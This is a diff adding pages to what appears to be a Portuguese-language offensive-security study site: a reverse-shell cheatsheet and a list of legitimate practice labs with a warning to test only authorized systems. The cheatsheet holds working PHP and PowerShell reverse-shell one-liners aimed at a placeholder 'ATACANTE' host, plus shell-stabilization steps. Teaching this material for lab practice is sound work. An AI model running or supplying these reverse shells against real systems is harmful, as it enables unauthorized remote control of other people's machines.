+
+<div class="sec"><div class="sl">PHP</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">php -r '$s=fsockopen("ATACANTE",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</td><td>Shell reverso PHP de uma linha</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">PowerShell (Windows)</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATACANTE',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2&gt;&amp;1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}"</td><td>Shell reverso PowerShell completo</td></tr>
+</tbody></table></div>
+
+<div class="cs-note">Depois de pegar a shell, estabilize: `python3 -c 'import pty;pty.spawn("/bin/bash")'`, Ctrl+Z, `stty raw -echo;fg`, `export TERM=xterm`. Gere one-liners prontos em revshells.com.</div>
+<div class="block-notes"><div class="bn-label">Minhas anotações sobre este cheatsheet</div><textarea id="notes-cs-revshells" placeholder="Escreva suas observações aqui..." oninput="updateNotesStatus('cs-revshells')" onchange="saveBlockNotes('cs-revshells')"></textarea><div class="bn-status" id="notes-status-cs-revshells">Salvo automaticamente</div></div>
+</div>
+
+<!-- LABS & PRÁTICA -->
+<div class="pg" id="pg-labs">
+<div class="ph"><div class="bc">cherry root quick edition <span>›</span> prática <span>›</span> labs</div><div class="pt">Labs & Prática</div><div class="ps">Plataformas selecionadas pra treinar de verdade — agrupadas por tema, com nível de dificuldade.</div></div>
+
+<div class="sec"><div class="sl">Iniciantes</div>
+<div class="lab-card"><div class="lab-head"><span class="lab-name"><a href="https://picoctf.org" target="_blank" rel="noopener">PicoCTF</a></span><span class="diff-badge diff-1">Iniciante</span></div><div class="lab-desc">CTF educacional da Carnegie Mellon. Desafios guiados de várias categorias — ótimo primeiro contato com segurança ofensiva.</div></div>
+<div class="lab-card"><div class="lab-head"><span class="lab-name"><a href="https://overthewire.org/wargames/bandit/" target="_blank" rel="noopener">OverTheWire · Bandit</a></span><span class="diff-badge diff-1">Iniciante</span></div><div class="lab-desc">Aprende fundamentos de Linux e SSH nível por nível. A base obrigatória antes de qualquer coisa mais avançada.</div></div>
+</div>
+
+<div class="sec"><div class="sl">Web</div>
+<div class="lab-card"><div class="lab-head"><span class="lab-name"><a href="https://tryhackme.com" target="_blank" rel="noopener">TryHackMe · OWASP Top 10</a></span><span class="diff-badge diff-1">Iniciante</span></div><div class="lab-desc">Trilha guiada cobrindo cada item do OWASP Top 10 com laboratório próprio. Teoria e prática lado a lado.</div></div>
+<div class="lab-card"><div class="lab-head"><span class="lab-name"><a href="https://portswigger.net/web-security" target="_blank" rel="noopener">PortSwigger Web Security Academy</a></span><span class="diff-badge diff-2">Intermediário</span></div><div class="lab-desc">A referência gratuita de segurança web, dos criadores do Burp Suite. Labs interativos de SQLi, XSS, SSRF e muito mais.</div></div>
+</div>
+
+<div class="sec"><div class="sl">Rede</div>
+<div class="lab-card"><div class="lab-head"><span class="lab-name"><a href="https://app.hackthebox.com/starting-point" target="_blank" rel="noopener">HTB · Starting Point</a></span><span class="diff-badge diff-2">Intermediário</span></div><div class="lab-desc">Trilha de entrada do Hack The Box. Máquinas com walkthrough que ensinam enumeração, exploração e movimento em rede.</div></div>
+</div>
+
+<div class="sec"><div class="sl">Linux</div>
+<div class="lab-card"><div class="lab-head"><span class="lab-name"><a href="https://overthewire.org/wargames/bandit/" target="_blank" rel="noopener">OverTheWire · Bandit</a></span><span class="diff-badge diff-1">Iniciante</span></div><div class="lab-desc">Domine o terminal Linux resolvendo enigmas que exigem comandos reais — find, grep, ssh, permissões, pipes.</div></div>
+</div>
+
+<div class="sec"><div class="sl">Privilege Escalation</div>
+<div class="lab-card"><div class="lab-head"><span class="lab-name"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM · Linux PrivEsc</a></span><span class="diff-badge diff-2">Intermediário</span></div><div class="lab-desc">Pratica SUID, sudo, cron e kernel exploits num alvo controlado. Complementa direto o cheatsheet de PrivEsc.</div></div>
+<div class="lab-card"><div class="lab-head"><span class="lab-name"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM · Windows PrivEsc</a></span><span class="diff-badge diff-3">Avançado</span></div><div class="lab-desc">Token impersonation, serviços mal configurados e AlwaysInstallElevated em laboratório Windows guiado.</div></div>
+</div>
+
+<div class="cs-note">Regra de ouro: só treine em ambientes feitos pra isso. Toda plataforma acima é legal e autorizada. Nunca aponte ferramentas pra sistemas que você não tem permissão escrita pra testar.</div>
+<div class="block-notes"><div class="bn-label">Minhas anotações sobre prática</div><textarea id="notes-labs" placeholder="Escreva suas observações aqui..." oninput="updateNotesStatus('labs')" onchange="saveBlockNotes('labs')"></textarea><div class="bn-status" id="notes-status-labs">Salvo automaticamente</div></div>
+</div>
+
 <!-- SEARCH MODAL -->
 <div class="smodal-overlay" id="smodal" onclick="searchCloseBg(event)">
   <div class="smodal" onclick="event.stopPropagation()">
@@ -2443,7 +2787,11 @@ var PAGE_LABELS={
   'd0':'Bloco 11 · Defense',
   'glossary':'Glossário','redflags':'Red Flags',
   'cs-ports':'Portas Conhecidas','cs-codes':'Códigos HTTP',
-  'cs-shortcuts':'Atalhos Terminal','cs-regex':'Regex Básico'
+  'cs-shortcuts':'Atalhos Terminal','cs-regex':'Regex Básico',
+  'cs-nmap':'Nmap por Categoria','cs-payloads':'Payloads Comuns',
+  'cs-owasp':'OWASP Top 10','cs-privesc':'Privilege Escalation',
+  'cs-encoding':'Encoding','cs-revshells':'Reverse Shells',
+  'labs':'Labs & Prática'
 };
 var BLOCK_IDS=['b0','w01','n0','l0','p0','s0','a0','t0','m0','se0','ml0','d0'];
 
